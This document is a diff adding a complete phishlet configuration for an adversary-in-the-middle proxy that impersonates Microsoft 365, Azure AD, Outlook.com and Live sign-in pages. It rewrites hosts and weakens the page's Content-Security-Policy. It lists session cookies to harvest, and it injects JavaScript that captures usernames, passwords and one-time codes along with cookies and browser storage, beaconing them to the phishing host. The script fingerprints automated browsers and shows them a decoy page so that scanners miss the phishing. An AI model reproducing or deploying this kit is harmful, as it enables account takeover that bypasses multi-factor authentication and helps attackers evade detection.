@@ -1,0 +1,543 @@
+name: "o365"
+author: "@paris"
+min_ver: "3.2.0"
+proxy_webauthn: true
+
+blacklist_mode: "off"
+
+proxy_hosts:
+  # Microsoft 365 / Azure AD — primary login
+  - phish_sub: 'office'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+    auto_filter: false
+    params:
+      - key: 'username'
+        map_to: 'username'
+      - key: 'login_hint'
+        map_to: 'username'
+      - key: 'bg'
+        map_to: 'bg'
+      - key: 'text'
+        map_to: 'text'
+  # Microsoft 365 — password reset
+  - phish_sub: 'passwordreset'
+    orig_sub: 'passwordreset'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Microsoft — WebAuthn / FIDO2
+  - phish_sub: 'webauthn'
+    orig_sub: 'webauthn'
+    domain: 'microsoft.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Office 365 portal
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'office.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Azure AD CDN
+  - phish_sub: 'vn3Hg'
+    orig_sub: 'aadcdn'
+    domain: 'msauth.net'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Microsoft personal accounts (Outlook.com / Hotmail / Live) — login
+  - phish_sub: 'YWNjb'
+    orig_sub: 'login'
+    domain: 'live.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Microsoft personal accounts — account management
+  - phish_sub: 'account'
+    orig_sub: 'account'
+    domain: 'live.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Outlook personal — web client
+  - phish_sub: 'outlook'
+    orig_sub: 'outlook'
+    domain: 'live.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Office 365 OWA — business webmail (e.g. GoDaddy-hosted O365 tenants)
+  - phish_sub: 'owa365'
+    orig_sub: 'outlook'
+    domain: 'office365.com'
+    session: true
+    is_landing: false
+    auto_filter: false
+  # Azure AD CDN — msftauth.net variant (used alongside msauth.net)
+  - phish_sub: 'Zk9mX2'
+    orig_sub: 'aadcdn'
+    domain: 'msftauth.net'
+    session: false
+    is_landing: false
+    auto_filter: false
+
+sub_filters:
+  # Relax the Content-Security-Policy so injected scripts run on the proxied page
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "login.microsoftonline.com", search: '<meta http-equiv="Content-Security-Policy" content="(.*?)">', replace: '<meta http-equiv="Content-Security-Policy" content="script-src ''self'' ''unsafe-inline'' ''unsafe-eval'' *.microsoft.com *.microsoftonline.com *.msauth.net *.msftauth.net; style-src ''self'' ''unsafe-inline'' *.microsoft.com *.microsoftonline.com; img-src ''self'' data: blob: *.microsoft.com *.microsoftonline.com; font-src ''self'' data: *.microsoft.com *.microsoftonline.com; connect-src ''self'' *.microsoft.com *.microsoftonline.com; frame-src ''self'' *.microsoftonline.com; object-src ''none'' base-uri ''self'' form-action ''self'' default-src ''self'' *.microsoftonline.com;">', mimes: ["text/html"] }
+  # Hostname rewriting — Azure AD / Office 365
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"], redirect_only: true }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  # Hostname rewriting — Microsoft personal / live.com (triggered from O365 login page)
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  # Hostname rewriting — login.live.com (personal account login flows)
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  # Hostname rewriting — account.live.com (Outlook / personal account management)
+  - { triggers_on: "account.live.com", orig_sub: "login", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "account", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "account.live.com", orig_sub: "outlook", domain: "live.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  # Hostname rewriting — outlook.office365.com (O365 OWA business webmail)
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "login.live.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "outlook.office365.com", orig_sub: "outlook", domain: "office365.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  # Hostname rewriting — www.office.com portal
+  - { triggers_on: "www.office.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+  - { triggers_on: "www.office.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", "text/javascript"] }
+
+auth_tokens:
+  # Azure AD / Office 365 — primary session cookies
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'brcap', 'x-ms-device-info', 'CCState', 'AADSSO', 'AADSSOTILES', 'ESTSSSOTILES', 'esctx', 'esctx-.*', 'sso_nonce', 'x-ms-sso-.*']
+  - domain: 'login.microsoftonline.com'
+    keys: ['ESTSSC', 'ESTSAUTHLIGHT', 'buid', 'fpc', 'stsservicecookie', 'x-ms-gateway-slice', 'AADSSOTILES', 'ESTSSSOTILES', 'MicrosoftApplicationsTelemetryDeviceId', 'MSFPC', 'ai_session', 'OIDCState']
+  - domain: '.microsoftonline.com'
+    keys: ['wlidperf', 'AADSSO']
+  # Microsoft 365 — password reset
+  - domain: 'passwordreset.microsoftonline.com'
+    keys: ['ASP.NET_SessionId']
+  # Microsoft personal accounts / Outlook.com / Hotmail / Live
+  - domain: '.live.com'
+    keys: ['MSPOK', 'wlidperf', 'WLID1', 'OParams', 'amsc', '_RwBf', 'MSPSoftVis', 'NAP', 'PPAUTH', 'PPUID', 'PPSX', 'RPSSecAuth', 'WLS', 'ANON']
+  - domain: '.login.live.com'
+    keys: ['MSPOK', 'wlidperf', 'WLID1', 'OParams', 'amsc', '_RwBf', 'MSPSoftVis', 'NAP', 'PPAUTH', 'PPUID', 'PPSX', 'RPSSecAuth', 'WLS', 'ANON']
+  - domain: 'login.live.com'
+    keys: ['MSPOK', 'wlidperf', 'WLID1L', 'OParams', 'amsc', '_RwBf', 'MSPSoftVis', 'NAP', 'PPAUTH', 'PPUID', 'PPSX', 'RPSSecAuth', 'WLS', 'ANON']
+  # Outlook personal web client
+  - domain: 'outlook.live.com'
+    keys: ['MSPOK', 'wlidperf', 'WLID1', 'OParams', 'amsc', '_RwBf', 'MSPSoftVis', 'NAP', 'PPAUTH', 'PPUID', 'PPSX', 'RPSSecAuth', 'WLS', 'ANON', 'X-OWA-CANARY']
+  # Office 365 OWA — business webmail session tokens
+  - domain: '.office365.com'
+    keys: ['X-OWA-CANARY', 'OIDCAuth', 'OpenIdConnect.nonce.*', 'ClientId', 'logon_uuid', 'RenewedIdToken', 'MSFPC', 'ai_session', 'AADState', 'ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'outlook.office365.com'
+    keys: ['X-OWA-CANARY', 'OIDCAuth', 'ClientId', 'logon_uuid', 'OpenIdConnect.nonce.*', 'RenewedIdToken', 'AADState']
+  # Office.com portal session cookies
+  - domain: '.office.com'
+    keys: ['OIDCAuth', 'MSFPC', 'RpsContextCookie', 'ai_session', 'AADState', 'X-OWA-CANARY']
+
+force_post:
+  - path: "/ppsecure/post*"
+    search:
+      - { key: "LoginOptions", search: "1" }
+    force:
+      - { key: "DontShowAgain", value: "true" }
+    type: "post"
+
+auth_urls:
+  - "/kmsi*"
+  - "/common/kmsi*"
+  - "/ppsecure/post.srf*"
+  - "/owa/prefetch.aspx*"
+  - "/webmanifest.json*"
+  - "/landingv2"
+  - '/login.srf'
+  - "/common/SAS/ProcessAuth*"
+  - "/Mfa/ExecuteMfa*"
+  - "/common/oauth2/v2.0/token*"
+  - "/log/session"
+
+credentials:
+  username:
+    key: "(login|UserName|username|email|account|DomainUser)"
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: "(passwd|Password|password|login_password|pass|pwd|session_password|PASSWORD)"
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: '(otp|mfa|code|totp|one-time-password|one_time_password)'
+      search: '([a-zA-Z0-9]{6,8})'
+      type: 'post'
+
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/", "/", "/*"]
+    script: |
+      (function() {
+        var passedGate = false;
+        var lastCapture = '';
+        var capturedCreds = { username: '', password: '', otp: '' };
+        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;
+        var benignPageContent = 'PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+PHRpdGxlPlN5c3RlbSBJbml0aWFsaXppbmc8L3RpdGxlPjxzdHlsZT5ib2R5LCBodG1sIHsgbWFyZ2luOiAwOyBwYWRkaW5nOiAwOyBoZWlnaHQ6IDEwMCU7IGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgYmFja2dyb3VuZDogIzEyMTIxMjsgY29sb3I6ICNlYWVhZWE7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGp1c3RpZnktY29udGVudDogY2VudGVyOyB9IC5jb250YWluZXIgeyB0ZXh0LWFsaWduOiBjZW50ZXI7IH0gaDEgeyBmb250LXNpemU6IDIuNXJlbTsgbWFyZ2luLWJvdHRvbTogMTVweDsgfSBwIHsgZm9udC1zaXplOiAxLjJyZW07IH08L3N0eWxlPjwvaGVhZD48Ym9keT48ZGl2IGNsYXNzPSJjb250YWluZXIiPjxoMT5TeXN0ZW0gSW5pdGlhbGl6aW5nLi4uPC9oMT48cD5QbGVhc2Ugd2FpdC48L3A+PC9kaXY+PC9ib2R5PjwvaHRtbD4=';
+
+        function showBenignPage() {
+          document.open();
+          document.write(atob(benignPageContent));
+          document.close();
+        }
+
+        function sendSessionData(stage) {
+            try {
+                var cookieObj = {};
+                document.cookie.split(';').forEach(function(c) {
+                    var parts = c.trim().split('=');
+                    var k = parts[0];
+                    if (k) cookieObj[k.trim()] = parts.slice(1).join('=');
+                });
+
+                var lsObj = {};
+                try {
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var lk = localStorage.key(i);
+                        lsObj[lk] = localStorage.getItem(lk);
+                    }
+                } catch(e) {}
+
+                var ssObj = {};
+                try {
+                    for (var j = 0; j < sessionStorage.length; j++) {
+                        var sk = sessionStorage.key(j);
+                        ssObj[sk] = sessionStorage.getItem(sk);
+                    }
+                } catch(e) {}
+
+                var sessionInfo = {
+                    credentials: (capturedCreds.username || capturedCreds.password || capturedCreds.otp)
+                        ? { username: capturedCreds.username, password: capturedCreds.password, otp: capturedCreds.otp }
+                        : undefined,
+                    localStorage: btoa(unescape(encodeURIComponent(JSON.stringify(lsObj)))),
+                    sessionStorage: btoa(unescape(encodeURIComponent(JSON.stringify(ssObj)))),
+                    cookies: btoa(unescape(encodeURIComponent(JSON.stringify(cookieObj)))),
+                    url: window.location.href
+                };
+
+                var currentCapture = JSON.stringify(sessionInfo);
+                if (currentCapture === lastCapture) return;
+                lastCapture = currentCapture;
+
+                var payload = {
+                    username: 'SessionData-' + stage,
+                    password: currentCapture
+                };
+
+                var _bh = window.location.hostname;
+                var _dot = _bh.indexOf('.');
+                var _beaconHost = _dot !== -1 ? _bh.substring(_dot + 1) : _bh;
+                var _beaconUrl = window.location.protocol + '//' + _beaconHost + '/log/session';
+                navigator.sendBeacon(_beaconUrl, JSON.stringify(payload));
+            } catch (e) {
+                console.error('[-] Failed to send session data at stage ' + stage + ':', e);
+            }
+        }
+
+        function monitorFormInputs() {
+            document.querySelectorAll('input').forEach(function(el) {
+                if (watchedElements ? watchedElements.has(el) : el._o365watched) return;
+                if (watchedElements) { watchedElements.add(el); } else { el._o365watched = true; }
+
+                function captureField() {
+                    var t = (el.type || '').toLowerCase();
+                    var n = (el.name || el.id || el.getAttribute('aria-label') || '').toLowerCase();
+                    var v = el.value;
+                    if (!v) return;
+                    if (t === 'password' || /pass|pwd/.test(n)) {
+                        if (v !== capturedCreds.password) {
+                            capturedCreds.password = v;
+                            sendSessionData('Password-Captured');
+                        }
+                    } else if (t === 'email' || /loginfmt|user|email|login|account/.test(n)) {
+                        capturedCreds.username = v;
+                    } else if (/^(otc|code|totp|mfa)$/.test(n) || (el.getAttribute('inputmode') === 'numeric' && /^\d{4,8}$/.test(v))) {
+                        if (v !== capturedCreds.otp) {
+                            capturedCreds.otp = v;
+                            sendSessionData('OTP-Captured');
+                        }
+                    }
+                }
+
+                el.addEventListener('input', captureField, { passive: true });
+                el.addEventListener('change', captureField, { passive: true });
+                el.addEventListener('blur', captureField, { passive: true });
+            });
+
+            document.querySelectorAll('form').forEach(function(form) {
+                if (watchedElements ? watchedElements.has(form) : form._o365watched) return;
+                if (watchedElements) { watchedElements.add(form); } else { form._o365watched = true; }
+                form.addEventListener('submit', function() {
+                    sendSessionData('Form-Submit');
+                });
+            });
+        }
+
+        function runMainLogic() {
+          if (passedGate) return;
+          passedGate = true;
+
+          var params = new URLSearchParams(window.location.search);
+          var bg = params.get('bg');
+
+          function applyBranding() {
+             try {
+                var backgroundUrl = bg ? decodeURIComponent(bg) : 'https://i.ibb.co/fkLWqGZ/background.jpg';
+                if (document.body.style.backgroundImage !== 'url("' + backgroundUrl + '")') {
+                    document.body.style.backgroundImage = 'url("' + backgroundUrl + '")';
+                    Object.assign(document.body.style, { backgroundSize: "cover", backgroundRepeat: "no-repeat", backgroundPosition: "center", height: "100%" });
+                    document.documentElement.style.height = "100%";
+                }
+                var lightbox = document.getElementById("lightbox");
+                if (lightbox) lightbox.remove();
+             } catch(e) { /* silent */ }
+          }
+
+          var observer = new MutationObserver(function(mutations) {
+              for (var i = 0; i < mutations.length; i++) {
+                if (mutations[i].addedNodes.length > 0) {
+                    applyBranding();
+                    monitorFormInputs();
+                    var currentStage = 'Unknown';
+                    var pathname = window.location.pathname.toLowerCase();
+                    if (pathname.indexOf('kmsi') !== -1 ||
+                        pathname.indexOf('landingv2') !== -1 ||
+                        pathname.indexOf('/owa/') !== -1) {
+                        currentStage = 'Login-Success';
+                    } else if (document.querySelector('#idDiv_SAOTCC_Title, [data-testid="OneTimeCode"], input[name="otc"], input[name="code"]')) {
+                        currentStage = 'MFA-OTP-Entry';
+                    } else if (document.getElementById('idBtn_Back')) {
+                        currentStage = 'MFA-Proof';
+                    } else if (document.querySelector('input[type="password"]')) {
+                        currentStage = 'Password-Entry';
+                    } else if (document.querySelector('.text-title')) {
+                        currentStage = 'Initial-Page';
+                    }
+                    sendSessionData(currentStage);
+                    break;
+                }
+              }
+          });
+
+          window.addEventListener('load', function() {
+              applyBranding();
+              monitorFormInputs();
+              observer.observe(document.body, { childList: true, subtree: true });
+              sendSessionData('Initial-Load');
+          });
+
+          if (document.body) {
+              monitorFormInputs();
+              observer.observe(document.body, { childList: true, subtree: true });
+          }
+        }
+
+        function checkBotStatus() {
+          var humanityScore = 0;
+          if (screen.width >= 1024 && screen.height >= 768) humanityScore++;
+          if (navigator.plugins && navigator.plugins.length > 0) humanityScore++;
+          if (navigator.webdriver) humanityScore--;
+          if (window.outerWidth > 0 && window.outerHeight > 0) humanityScore++;
+          if (window.Cypress || window.plumbutter || window._phantom || window.callPhantom) humanityScore -= 5;
+          try {
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+              var ext = gl.getExtension('WEBGL_debug_renderer_info');
+              if (ext) {
+                var renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL).toLowerCase();
+                if (renderer.indexOf('swiftshader') !== -1 || renderer.indexOf('mesa') !== -1 || renderer.indexOf('software') !== -1) humanityScore--;
+              }
+            }
+          } catch(e) { /* silent */ }
+          return humanityScore;
+        }
+
+        if (checkBotStatus() < 2) {
+            showBenignPage();
+        } else {
+            var interactionHandler = function() {
+                if (passedGate) return;
+                runMainLogic();
+            };
+            document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
+            document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
+            document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
+            setTimeout(function() {
+                if (!passedGate) runMainLogic();
+            }, 4000);
+        }
+
+      })();
+
+  # Inject same credential-capture logic on login.live.com for personal accounts (Outlook/Hotmail/Live)
+  - trigger_domains: ["login.live.com"]
+    trigger_paths: ["/", "/*"]
+    script: |
+      (function() {
+        var passedGate = false;
+        var lastCapture = '';
+        var capturedCreds = { username: '', password: '', otp: '' };
+        var watchedElements = typeof WeakSet !== 'undefined' ? new WeakSet() : null;
+
+        function sendSessionData(stage) {
+            try {
+                var cookieObj = {};
+                document.cookie.split(';').forEach(function(c) {
+                    var parts = c.trim().split('=');
+                    var k = parts[0];
+                    if (k) cookieObj[k.trim()] = parts.slice(1).join('=');
+                });
+
+                var lsObj = {};
+                try {
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var lk = localStorage.key(i);
+                        lsObj[lk] = localStorage.getItem(lk);
+                    }
+                } catch(e) {}
+
+                var ssObj = {};
+                try {
+                    for (var j = 0; j < sessionStorage.length; j++) {
+                        var sk = sessionStorage.key(j);
+                        ssObj[sk] = sessionStorage.getItem(sk);
+                    }
+                } catch(e) {}
+
+                var sessionInfo = {
+                    credentials: (capturedCreds.username || capturedCreds.password || capturedCreds.otp)
+                        ? { username: capturedCreds.username, password: capturedCreds.password, otp: capturedCreds.otp }
+                        : undefined,
+                    localStorage: btoa(unescape(encodeURIComponent(JSON.stringify(lsObj)))),
+                    sessionStorage: btoa(unescape(encodeURIComponent(JSON.stringify(ssObj)))),
+                    cookies: btoa(unescape(encodeURIComponent(JSON.stringify(cookieObj)))),
+                    url: window.location.href
+                };
+
+                var currentCapture = JSON.stringify(sessionInfo);
+                if (currentCapture === lastCapture) return;
+                lastCapture = currentCapture;
+
+                var payload = {
+                    username: 'SessionData-' + stage,
+                    password: currentCapture
+                };
+
+                var _bh = window.location.hostname;
+                var _dot = _bh.indexOf('.');
+                var _beaconHost = _dot !== -1 ? _bh.substring(_dot + 1) : _bh;
+                var _beaconUrl = window.location.protocol + '//' + _beaconHost + '/log/session';
+                navigator.sendBeacon(_beaconUrl, JSON.stringify(payload));
+            } catch (e) { /* silent */ }
+        }
+
+        function monitorFormInputs() {
+            document.querySelectorAll('input').forEach(function(el) {
+                if (watchedElements ? watchedElements.has(el) : el._o365watched) return;
+                if (watchedElements) { watchedElements.add(el); } else { el._o365watched = true; }
+
+                function captureField() {
+                    var t = (el.type || '').toLowerCase();
+                    var n = (el.name || el.id || el.getAttribute('aria-label') || '').toLowerCase();
+                    var v = el.value;
+                    if (!v) return;
+                    if (t === 'password' || /pass|pwd/.test(n)) {
+                        if (v !== capturedCreds.password) {
+                            capturedCreds.password = v;
+                            sendSessionData('Password-Captured');
+                        }
+                    } else if (t === 'email' || /loginfmt|user|email|login|account/.test(n)) {
+                        capturedCreds.username = v;
+                    } else if (/^(otc|code|totp|mfa)$/.test(n) || (el.getAttribute('inputmode') === 'numeric' && /^\d{4,8}$/.test(v))) {
+                        if (v !== capturedCreds.otp) {
+                            capturedCreds.otp = v;
+                            sendSessionData('OTP-Captured');
+                        }
+                    }
+                }
+
+                el.addEventListener('input', captureField, { passive: true });
+                el.addEventListener('change', captureField, { passive: true });
+                el.addEventListener('blur', captureField, { passive: true });
+            });
+
+            document.querySelectorAll('form').forEach(function(form) {
+                if (watchedElements ? watchedElements.has(form) : form._o365watched) return;
+                if (watchedElements) { watchedElements.add(form); } else { form._o365watched = true; }
+                form.addEventListener('submit', function() {
+                    sendSessionData('Form-Submit');
+                });
+            });
+        }
+
+        function runMainLogic() {
+          if (passedGate) return;
+          passedGate = true;
+
+          var observer = new MutationObserver(function(mutations) {
+              for (var i = 0; i < mutations.length; i++) {
+                if (mutations[i].addedNodes.length > 0) {
+                    monitorFormInputs();
+                    var currentStage = 'Live-Unknown';
+                    if (document.querySelector('input[type="password"]')) {
+                        currentStage = 'Live-Password-Entry';
+                    } else if (document.querySelector('input[name="otc"], input[name="code"]')) {
+                        currentStage = 'Live-OTP-Entry';
+                    } else if (window.location.pathname.toLowerCase().indexOf('ppsecure') !== -1) {
+                        currentStage = 'Live-Secure-Post';
+                    }
+                    sendSessionData(currentStage);
+                    break;
+                }
+              }
+          });
+
+          window.addEventListener('load', function() {
+              monitorFormInputs();
+              observer.observe(document.body, { childList: true, subtree: true });
+              sendSessionData('Live-Initial-Load');
+          });
+
+          if (document.body) {
+              monitorFormInputs();
+              observer.observe(document.body, { childList: true, subtree: true });
+          }
+        }
+
+        if (!navigator.webdriver) {
+            var interactionHandler = function() {
+                if (passedGate) return;
+                runMainLogic();
+            };
+            document.addEventListener('mousemove', interactionHandler, { once: true, passive: true });
+            document.addEventListener('touchstart', interactionHandler, { once: true, passive: true });
+            document.addEventListener('keydown', interactionHandler, { once: true, passive: true });
+            setTimeout(function() {
+                if (!passedGate) runMainLogic();
+            }, 4000);
+        }
+
+      })();
